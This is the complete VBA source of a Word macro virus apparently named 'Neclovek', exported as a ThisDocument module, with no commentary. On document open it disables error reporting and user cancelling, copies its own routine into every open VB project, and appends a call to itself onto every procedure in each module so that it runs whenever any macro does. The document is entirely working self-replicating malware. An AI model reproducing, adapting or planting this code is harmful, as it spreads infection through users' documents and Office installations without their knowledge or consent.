VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Function IT()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Set A = VBE.SelectedVBComponent.CodeModule
B = A.Lines(A.ProcStartLine("IT", vbext_pk_Proc), A.ProcCountLines("IT", vbext_pk_Proc))
For c = 1 To VBE.VBProjects.Count
For D = 1 To VBE.VBProjects(c).VBComponents.Count
Set E = VBE.VBProjects(c).VBComponents(D).CodeModule
If E.ProcOfLine(E.ProcStartLine("IT", vbext_pk_Proc), 1) <> "IT" And E.CountOfLines > 2 Then E.AddFromString B
For F = 1 To E.CountOfLines
G = E.ProcOfLine(F, 1)
If H <> G And G <> "IT" And Right(E.Lines(E.ProcStartLine(G, vbext_pk_Proc), 1), 4) <> ": IT" Then
E.ReplaceLine E.ProcStartLine(G, vbext_pk_Proc), E.Lines(E.ProcStartLine(G, vbext_pk_Proc), 1) & ": IT"
H = G
End If
Next
Next
Next
End Function
Private Sub Document_Open(): IT
'My_Creator = Lys Kovick
'My_Name = Neclovek
'My_Comments = Do Not Distribute!
End Sub
